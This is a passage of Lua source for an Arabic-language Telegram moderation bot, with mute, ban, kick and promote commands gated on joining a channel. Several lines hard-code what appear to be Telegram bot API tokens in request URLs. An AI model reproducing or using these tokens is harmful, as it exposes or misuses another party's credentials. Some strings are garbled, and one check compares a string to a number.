send(msg.chat_id_, msg.id_, 1, '🙋🏻‍♂️┇ لا تستطيع مسح رسائل (مدراء، ادمنية،مميزين)البوت   ', 1, 'md')
return false 
else
del_all_msgs(msg.chat_id_, ass[2])
send(msg.chat_id_, msg.id_, 1, '👤┇العضو ~⪼ *('..ass[2]..')* \n🗑┇تم حذف كل رسائله\n', 1, 'md')
end
end

if text:match("^حذف الكل @(.*)$") and (is_owner(msg) or is_creatorbasic(msg)) then
local apbll = {string.match(text, "^(حذف الكل) @(.*)$")}
function delall_by_username(extra, result, success)
if result.id_ then
if ck_mod(result.id_, msg.chat_id_) or is_creatorbasicid(result.id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, 1, '🙋🏻‍♂️┇ لا تستطيع مسح رسائل (مدراء، ادمنية،مميزين)البوت   ', 1, 'md')
return false
end
del_all_msgs(msg.chat_id_, result.id_)
texts = '👤┇العضو ~⪼ ('..result.id_..') \n🗑┇تم حذف كل رسائله'
else
texts = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texts, 1, 'html')
end
resolve_username(apbll[2],delall_by_username)
end
-----------------------------------------banall--------------------------------------------------
if text:match("^حظر عام$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add) and msg.reply_to_message_id_ then
function gban_by_reply(extra, result, success)
local hash =  'SNIEBR:'..bot_id..'gbanned:'
datahmade:sadd(hash, result.sender_user_id_)
chat_kick(result.chat_id_, result.sender_user_id_)
tsX000("prore",msg,"🚫┇تم حظره من مجموعات البوت")
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,gban_by_reply)
end

if text:match("^حظر عام @(.*)$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
local apbll = {string.match(text, "^(حظر عام) @(.*)$")}
function gban_by_username(extra, result, success)
if result.id_ then
local hash =  'SNIEBR:'..bot_id..'gbanned:'
texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apbll[2] or 'SNIEBR')..')\n🚫┇تم حظره من المجموعات البوت'
datahmade:sadd(hash, result.id_)
else
texts = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
end
resolve_username(apbll[2],gban_by_username)
end

if text:match("^حظر عام (%d+)$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
local apbll = {string.match(text, "^(حظر عام) (%d+)$")}
local hash =  'SNIEBR:'..bot_id..'gbanned:'
datahmade:sadd(hash, apbll[2])
tsX000(apbll[2],msg,"🚫┇تم حظره من المجموعات البوت")
end
if text:match("^الغاء العام$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add) and msg.reply_to_message_id_ then
function ungban_by_reply(extra, result, success)
local hash =  'SNIEBR:'..bot_id..'gbanned:'
tsX000("prore",msg,"🚫┇تم الغاء حظره من المجموعات البوت")
datahmade:srem(hash, result.sender_user_id_)
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,ungban_by_reply)
end

if text:match("^الغاء العام @(.*)$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
local apid = {string.match(text, "^(الغاء العام) @(.*)$")}
function ungban_by_username(extra, result, success)
local hash =  'SNIEBR:'..bot_id..'gbanned:'
if result.id_ then
texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apid[2] or 'SNIEBR')..')\n��┇تم الغاء حظره من المجموعات البوت'
datahmade:srem(hash, result.id_)
else
texts = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
end
resolve_username(apid[2],ungban_by_username)
end

if text:match("^الغاء العام (%d+)$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
local apbll = {string.match(text, "^(الغاء العام) (%d+)$")}
local hash =  'SNIEBR:'..bot_id..'gbanned:'
datahmade:srem(hash, apbll[2])
tsX000(apbll[2],msg,"🚫┇تم الغاء حظره من مجموعات البوت")
end

if text:match("^كتم عام$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add) and msg.reply_to_message_id_ then
function gmute_by_reply(extra, result, success)
if result.sender_user_id_ == tonumber(sudo_add) then
send(msg.chat_id_, msg.id_, 1, "📮┇لا يمكنك كتم المطور الاساسي \n", 1, 'md')
return false 
end
local hash =  'SNIEBR:'..bot_id..'gmuted:'
datahmade:sadd(hash, result.sender_user_id_)
tsX000("prore",msg,"🚫┇تم كتمه من المجموعات البوت")
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,gmute_by_reply)
end

if text:match("^كتم عام @(.*)$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
local apbll = {string.match(text, "^(كتم عام) @(.*)$")}
function gmute_by_username(extra, result, success)
if result.id_ then
if result.id_ == tonumber(sudo_add) then
send(msg.chat_id_, msg.id_, 1, "📮┇لا يمكنك كتم المطور الاساسي \n", 1, 'md')
return false 
end
local hash =  'SNIEBR:'..bot_id..'gmuted:'
texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apbll[2] or 'SNIEBR')..')\n🚫┇تم كتمه من المجموعات البوت'
datahmade:sadd(hash, result.id_)
else
texts = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
end
resolve_username(apbll[2],gmute_by_username)
end

if text:match("^كتم عام (%d+)$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
local apbll = {string.match(text, "^(كتم عام) (%d+)$")}
if apbll[2] == tonumber(sudo_add) then
send(msg.chat_id_, msg.id_, 1, "📮┇لا يمكنك كتم المطور الاساسي \n", 1, 'md')
return false 
end
local hash =  'SNIEBR:'..bot_id..'gmuted:'
datahmade:sadd(hash, apbll[2])
tsX000(apbll[2],msg,"🚫┇تم كتمه من المجموعات البوت")
end
if text:match("^الغاء كتم العام$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add) and msg.reply_to_message_id_ then
function ungmute_by_reply(extra, result, success)
local hash =  'SNIEBR:'..bot_id..'gmuted:'
tsX000("prore",msg,"🚫┇تم الغاء كتمه من المجموعات البوت")
datahmade:srem(hash, result.sender_user_id_)
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,ungmute_by_reply)
end

if text:match("^الغاء كتم العام @(.*)$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
local apid = {string.match(text, "^(الغاء كتم العام) @(.*)$")}
function ungmute_by_username(extra, result, success)
local hash =  'SNIEBR:'..bot_id..'gmuted:'
if result.id_ then
texts = '💁🏻‍♂️※ العضو ✓['..result.title_..'](t.me/'..(apid[2] or 'SNIEBR_files')..')\n🚫┇تم الغاء كتمه من المجموعات البوت'
datahmade:srem(hash, result.id_)
else
texts = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
end
resolve_username(apid[2],ungmute_by_username)
end

if text:match("^الغاء كتم العام (%d+)$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
local apbll = {string.match(text, "^(الغاء كتم العام) (%d+)$")}
local hash =  'SNIEBR:'..bot_id..'gmuted:'
datahmade:srem(hash, apbll[2])
tsX000(apbll[2],msg,"🚫┇تم الغاء كتمه من المجموعات البوت")
end

if text:match("^كتم$") and (is_mod(msg) or is_creatorbasic(msg)) and msg.reply_to_message_id_ ~= 0 then
local res = https.request('https://api.telegram.org/bot1170522933:AAEGNWVfIfhWrJlaxQaALddEIAOr7z39lc0/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot1170522933:AAEGNWVfIfhWrJlaxQaALddEIAOr7z39lc0/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
-- @XOUXUFreeON.decode(url)
if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
return false end
function mute_by_reply(extra, result, success)
local hash =  'SNIEBR:'..bot_id..'muted:'..msg.chat_id_
if ck_mod(result.sender_user_id_, msg.chat_id_) or is_creatorbasicid(result.sender_user_id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, 1, '🙋🏻‍♂️┇ لا تستطيع كتم (مدراء، ادمنية،مميزين)البوت   ', 1, 'md')
return false 

else
if datahmade:sismember(hash, result.sender_user_id_) then
tsX000("prore",msg,"🚫┇بالفعل تم كتمه")
else
datahmade:sadd(hash, result.sender_user_id_)
tsX000("prore",msg,"🚫┇تم كتمه من البوت")
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,mute_by_reply)
end
if text:match("^كتم @(.*)$") and (is_mod(msg) or is_creatorbasic(msg)) then
local apsi = {string.match(text, "^(كتم) @(.*)$")}
local res = https.request('https://api.telegram.org/bot1170522933:AAEGNWVfIfhWrJlaxQaALddEIAOr7z39lc0/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot1170522933:AAEGNWVfIfhWrJlaxQaALddEIAOr7z39lc0/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
-- @XOUXUFreeON.decode(url)
if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
return false end
function mute_by_username(extra, result, success)
if result.id_ then
if ck_mod(result.id_, msg.chat_id_) or is_creatorbasicid(result.id_, msg.chat_id_)then
send(msg.chat_id_, msg.id_, 1, '🙋🏻‍♂️┇ لا تستطيع كتم (مدراء، ادمنية،مميزين)البوت   ', 1, 'md')
return false 
else 
datahmade:sadd('SNIEBR:'..bot_id..'muted:'..msg.chat_id_, result.id_)
texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apsi[2] or 'SNIEBR')..')\n🚫┇تم كتمه من البوت'
end
else
texts = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
end
resolve_username(apsi[2],mute_by_username)
end
if text:match("^كتم (%d+)$") and (is_mod(msg) or is_creatorbasic(msg)) then
local res = https.request('https://api.telegram.org/bot1170522933:AAEGNWVfIfhWrJlaxQaALddEIAOr7z39lc0/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot1170522933:AAEGNWVfIfhWrJlaxQaALddEIAOr7z39lc0/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
-- @XOUXUFreeON.decode(url)
if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
return false end
local apsi = {string.match(text, "^(كتم) (%d+)$")}
if ck_mod(apsi[2], msg.chat_id_) or is_creatorbasicid(apsi[2], msg.chat_id_)  then
send(msg.chat_id_, msg.id_, 1, '🙋🏻‍♂️┇ لا تستطيع كتم (مدراء، ادمنية،مميزين)البوت   ', 1, 'md')
return false 
else
datahmade:sadd('SNIEBR:'..bot_id..'muted:'..msg.chat_id_, apsi[2])
tsX000(apsi[2],msg,"🚫┇تم كتمه من البوت")
end
end
if text:match("^الغاء كتم$") and (is_mod(msg) or is_creatorbasic(msg)) and msg.reply_to_message_id_ then
function unmute_by_reply(extra, result, success)
local hash =  'SNIEBR:'..bot_id..'muted:'..msg.chat_id_
if not datahmade:sismember(hash, result.sender_user_id_) then
tsX000("prore",msg,"🚫┇بالفعل تم الغاء كتمه من البوت")
else
datahmade:srem(hash, result.sender_user_id_)
tsX000("prore",msg,"🚫┇تم الغاء كتمه من البوت")
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,unmute_by_reply)
end
if text:match("^الغاء كتم @(.*)$") and (is_mod(msg) or is_creatorbasic(msg)) then
local apsi = {string.match(text, "^(الغاء كتم) @(.*)$")}
function unmute_by_username(extra, result, success)
if result.id_ then
datahmade:srem('SNIEBR:'..bot_id..'muted:'..msg.chat_id_, result.id_)
texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apsi[2] or 'SNIEBR')..')\n🚫┇تم الغاء كتمه من البوت'
else
texts = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
end
resolve_username(apsi[2],unmute_by_username)
end

if text:match("^الغاء كتم (%d+)$") and (is_mod(msg) or is_creatorbasic(msg)) then
local apsi = {string.match(text, "^(الغاء كتم) (%d+)$")}
datahmade:srem('SNIEBR:'..bot_id..'muted:'..msg.chat_id_, apsi[2])
tsX000(apsi[2],msg,"🚫┇تم الغاء كتمه من البوت")
end

if text:match("^طرد$") and msg.reply_to_message_id_ ~=0 and (is_mod(msg) or is_creatorbasic(msg)) then
local res = https.request('https://api.telegram.org/bot1170522933:AAEGNWVfIfhWrJlaxQaALddEIAOr7z39lc0/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot1170522933:AAEGNWVfIfhWrJlaxQaALddEIAOr7z39lc0/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
-- @XOUXUFreeON.decode(url)
if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
return false end
if not is_creator(msg) and not is_setban(msg) and datahmade:get("SNIEBR:lock:ban_and_kick"..bot_id..msg.chat_id_) then 
send(msg.chat_id_, msg.id_, 1, '✖┇لا تستطيع طرد', 1, 'md')
return "tshakke"
end
function kick_reply(extra, result, success)
if ck_mod(result.sender_user_id_, msg.chat_id_) or is_creatorbasicid(result.sender_user_id_, msg.chat_id_)  then
send(msg.chat_id_, msg.id_, 1, '🙋🏻‍♂️┇ لا تستطيع حظر او طرد (مدراء، ادمنية،مميزين)البوت   ', 1, 'md')
return false 
else
tsX000("prore",msg,"🚫┇تم طرده من المجموعه")
chat_kick(result.chat_id_, result.sender_user_id_)
end
end
getMessage(msg.chat_id_,msg.reply_to_message_id_,kick_reply)
return false
end  
if text:match("^طرد @(.*)$") and (is_mod(msg) or is_creatorbasic(msg)) then 
local res = https.request('https://api.telegram.org/bot1170522933:AAEGNWVfIfhWrJlaxQaALddEIAOr7z39lc0/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot1170522933:AAEGNWVfIfhWrJlaxQaALddEIAOr7z39lc0/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
-- @XOUXUFreeON.decode(url)
if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
return false end
if not is_creator(msg) and not is_setban(msg) and datahmade:get("SNIEBR:lock:ban_and_kick"..bot_id..msg.chat_id_) then
send(msg.chat_id_, msg.id_, 1, '✖┇لا تستطيع طرد', 1, 'md')
return "tshakke"
end
local apki = {string.match(text, "^(طرد) @(.*)$")}
function kick_by_username(extra, result, success)
if result.id_ then
if ck_mod(result.id_, msg.chat_id_) or is_creatorbasicid(result.id_, msg.chat_id_)   then
send(msg.chat_id_, msg.id_, 1, '🙋🏻‍♂️┇ لا تستطيع حظر او طرد (مدراء، ادمنية،مميزين)البوت   ', 1, 'md')
return false 
else
texts = '💁🏻‍♂️※ العضو ✓['..result.title_..'](t.me/'..(apki[2] or 'SNIEBR_files')..')\n🚫┇تم طرده من المجموعه'
chat_kick(msg.chat_id_, result.id_)
end
else
texts = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
end
resolve_username(apki[2],kick_by_username)
return false
end  
if text:match("^طرد (%d+)$") and (is_mod(msg) or is_creatorbasic(msg)) then 
if not is_creator(msg) and not is_setban(msg) and datahmade:get("SNIEBR:lock:ban_and_kick"..bot_id..msg.chat_id_) then 

send(msg.chat_id_, msg.id_, 1, '✖┇لا تستطيع طرد', 1, 'md')
return "tshakke"
end
local apki = {string.match(text, "^(طرد) (%d+)$")}
if ck_mod(apki[2], msg.chat_id_) or is_creatorbasicid(apki[2], msg.chat_id_) then
send(msg.chat_id_, msg.id_, 1, '🙋🏻‍♂️┇ لا تستطيع حظر او طرد (مدراء، ادمنية،مميزين)البوت   ', 1, 'md')
return false 
else
chat_kick(msg.chat_id_, apki[2])
tsX000(apki[2],msg,"🚫┇تم طرده من المجموعه")
end
end
if text:match("^تنزيل الكل$")and msg.reply_to_message_id_ then
local res = https.request('https://api.telegram.org/bot1170522933:AAEGNWVfIfhWrJlaxQaALddEIAOr7z39lc0/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot1170522933:AAEGNWVfIfhWrJlaxQaALddEIAOr7z39lc0/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
-- @XOUXUFreeON.decode(url)
if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
return false end
function promote_by_reply(extra, result, success)
if result.sender_user_id_ == tonumber(sudo_add) then
send(msg.chat_id_, msg.id_, 1, "دكعد راحه هذا المطور الاساسي", 1, 'md')
return false 
end
if msg.sender_user_id_ == tonumber(sudo_add) then
datahmade:srem('SNIEBR:'..bot_id..'sudoo'..result.sender_user_id_..'', 'no')
datahmade:srem('SNIEBR:'..bot_id..'dev', result.sender_user_id_)
datahmade:srem('SNIEBR:'..bot_id..'mods:'..msg.chat_id_, result.sender_user_id_)
datahmade:srem('SNIEBR:'..bot_id..'vipgp:'..msg.chat_id_, result.sender_user_id_)
datahmade:srem('SNIEBR:'..bot_id..'owners:'..msg.chat_id_, result.sender_user_id_)
datahmade:srem('SNIEBR:'..bot_id..'creator:'..msg.chat_id_, result.sender_user_id_)
datahmade:srem('SNIEBR:'..bot_id..'creatorbasic:'..msg.chat_id_,result.sender_user_id_)
t = '( المطورين - المنشئين الاساسين - المنشئين - المدراء - الادمنيه - المميزين )'
elseif redis:sismember('SNIEBR:'..bot_id..'dev',msg.sender_user_id_) then
datahmade:srem('SNIEBR:'..bot_id..'mods:'..msg.chat_id_, result.sender_user_id_)
datahmade:srem('SNIEBR:'..bot_id..'vipgp:'..msg.chat_id_, result.sender_user_id_)
datahmade:srem('SNIEBR:'..bot_id..'owners:'..msg.chat_id_, result.sender_user_id_)
datahmade:srem('SNIEBR:'..bot_id..'creator:'..msg.chat_id_, result.sender_user_id_)
datahmade:srem('SNIEBR:'..bot_id..'creatorbasic:'..msg.chat_id_,result.sender_user_id_)
t = '( المنشئين الاساسين - المنشئين - المدراء - الادمنيه - المميزين )'
elseif datahmade:sismember('SNIEBR:'..bot_id..'creatorbasic:'..msg.chat_id_, msg.sender_user_id_) then
datahmade:srem('SNIEBR:'..bot_id..'mods:'..msg.chat_id_, result.sender_user_id_)
datahmade:srem('SNIEBR:'..bot_id..'vipgp:'..msg.chat_id_, result.sender_user_id_)
datahmade:srem('SNIEBR:'..bot_id..'owners:'..msg.chat_id_, result.sender_user_id_)
datahmade:srem('SNIEBR:'..bot_id..'creator:'..msg.chat_id_, result.sender_user_id_)
t = '( المنشئين - المدراء - الادمنيه - المميزين )'
elseif datahmade:sismember('SNIEBR:'..bot_id..'creator:'..msg.chat_id_, msg.sender_user_id_) then
datahmade:srem('SNIEBR:'..bot_id..'mods:'..msg.chat_id_, result.sender_user_id_)
datahmade:srem('SNIEBR:'..bot_id..'vipgp:'..msg.chat_id_, result.sender_user_id_)
datahmade:srem('SNIEBR:'..bot_id..'owners:'..msg.chat_id_, result.sender_user_id_)
t = '( المدراء - الادمنيه - المميزين )'
elseif datahmade:sismember('SNIEBR:'..bot_id..'owners:'..msg.chat_id_, msg.sender_user_id_) then
datahmade:srem('SNIEBR:'..bot_id..'mods:'..msg.chat_id_, result.sender_user_id_)
datahmade:srem('SNIEBR:'..bot_id..'vipgp:'..msg.chat_id_, result.sender_user_id_)
t = '( الادمنيه - المميزين )'
end
send(msg.chat_id_, msg.id_, 1, "🔖┇ تم تنزيل الشخص من الرتب التاليه "..t.." \n", 1, 'md')
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end

if text:match("^رفع مدير$") and (is_creator(msg) or is_creatorbasic(msg)) and msg.reply_to_message_id_ then
local res = https.request('https://api.telegram.org/bot1170522933:AAEGNWVfIfhWrJlaxQaALddEIAOr7z39lc0/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot1170522933:AAEGNWVfIfhWrJlaxQaALddEIAOr7z39lc0/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
-- @XOUXUFreeON.decode(url)
if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
return false end
 if not is_creator(msg) and datahmade:get("SNIEBR:lock:promote"..bot_id..msg.chat_id_) then 
send(msg.chat_id_, msg.id_, 1, "⚙️※ عذرا خاصية الرفع تم تعطيلها ❌ ", 1, 'md')
return false end
function setowner_by_reply(extra, result, success)
local hash =  'SNIEBR:'..bot_id..'owners:'..msg.chat_id_
if datahmade:sismember(hash, result.sender_user_id_) then
tsX000("prore",msg,"🔖┇بالفعل تم رفعة مدير في البوت")
else
datahmade:sadd(hash, result.sender_user_id_)
tsX000("prore",msg,"??┇تم رفعة مدير في البوت")
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,setowner_by_reply)
end  
if text:match("^رفع مدير @(.*)$") and (is_creator(msg) or is_creatorbasic(msg)) then
 if not is_creator(msg) and datahmade:get("SNIEBR:lock:promote"..bot_id..msg.chat_id_) then 
send(msg.chat_id_, msg.id_, 1, "⚙️※ عذرا خاصية الرفع تم تعطيلها ❌ ", 1, 'md')
return false end
local apow = {string.match(text, "^(رفع مدير) @(.*)$")}
function setowner_by_username(extra, result, success)
if result.id_ then
datahmade:sadd('SNIEBR:'..bot_id..'owners:'..msg.chat_id_, result.id_)
texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apow[2] or 'SNIEBR')..')\n🔖┇تم رفعة مدير في البوت'
else
texts = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
end
resolve_username(apow[2],setowner_by_username)
end 

if text:match("^رفع مدير (%d+)$") and (is_creator(msg) or is_creatorbasic(msg)) then
local res = https.request('https://api.telegram.org/bot1170522933:AAEGNWVfIfhWrJlaxQaALddEIAOr7z39lc0/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot1170522933:AAEGNWVfIfhWrJlaxQaALddEIAOr7z39lc0/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
-- @XOUXUFreeON.decode(url)
if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
return false end
 if not is_creator(msg) and datahmade:get("SNIEBR:lock:promote"..bot_id..msg.chat_id_) then 
send(msg.chat_id_, msg.id_, 1, "⚙️※ عذرا خاصية الرفع تم تعطيلها ❌ ", 1, 'md')
return false end
local apow = {string.match(text, "^(رفع مدير) (%d+)$")}
datahmade:sadd('SNIEBR:'..bot_id..'owners:'..msg.chat_id_, apow[2])
tsX000(apow[2],msg,"🔖┇تم رفعة مدير في البوت")
end  
if text:match("^تنزيل مدير$") and (is_creator(msg) or is_creatorbasic(msg)) and msg.reply_to_message_id_ then
function deowner_by_reply(extra, result, success)
local hash =  'SNIEBR:'..bot_id..'owners:'..msg.chat_id_
if not datahmade:sismember(hash, result.sender_user_id_) then
tsX000("prore",msg,"🔰┇بالفعل تم تنزيله من مدراء  البوت ")
else
datahmade:srem(hash, result.sender_user_id_)
tsX000("prore",msg,"🔰┇تم تنزيله من مدراء  البوت")
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,deowner_by_reply)
end  
if text:match("^تنزيل مدير @(.*)$") and (is_creator(msg) or is_creatorbasic(msg)) then
local apow = {string.match(text, "^(تنزيل مدير) @(.*)$")}
local hash =  'SNIEBR:'..bot_id..'owners:'..msg.chat_id_
function remowner_by_username(extra, result, success)
if result.id_ then
datahmade:srem(hash, result.id_)
texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apow[2] or 'SNIEBR')..')\n🔰┇تم تنزيله من مدراء  البوت'
else
texts = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
end
resolve_username(apow[2],remowner_by_username)
end  
if text:match("^تنزيل مدير (%d+)$") and (is_creator(msg) or is_creatorbasic(msg)) then
local hash =  'SNIEBR:'..bot_id..'owners:'..msg.chat_id_
local apow = {string.match(text, "^(تنزيل مدير) (%d+)$")}
datahmade:srem(hash, apow[2])
tsX000(apow[2],msg,"🔰┇تم تنزيله من مدراء  البوت ")
end
